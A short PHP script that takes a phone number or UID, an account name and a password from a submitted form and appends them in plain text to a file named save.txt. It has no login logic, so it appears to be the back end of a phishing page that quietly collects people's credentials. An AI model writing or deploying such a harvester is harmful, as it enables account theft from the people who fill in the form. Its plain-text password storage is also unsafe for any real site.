<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $uid = $_POST["phone"] ?? "";
    $account = $_POST["account"] ?? "";
    $password = $_POST["password"] ?? "";

    // save.txt ge data save
    $data = "UID: " . $uid . PHP_EOL;
    $data .= "Account: " . $account . PHP_EOL;
    $data .= "Password: " . $password . PHP_EOL;
    $data .= "----------------------" . PHP_EOL;

    file_put_contents("save.txt", $data, FILE_APPEND | LOCK_EX);

    echo "Data saved successfully!";
}
?>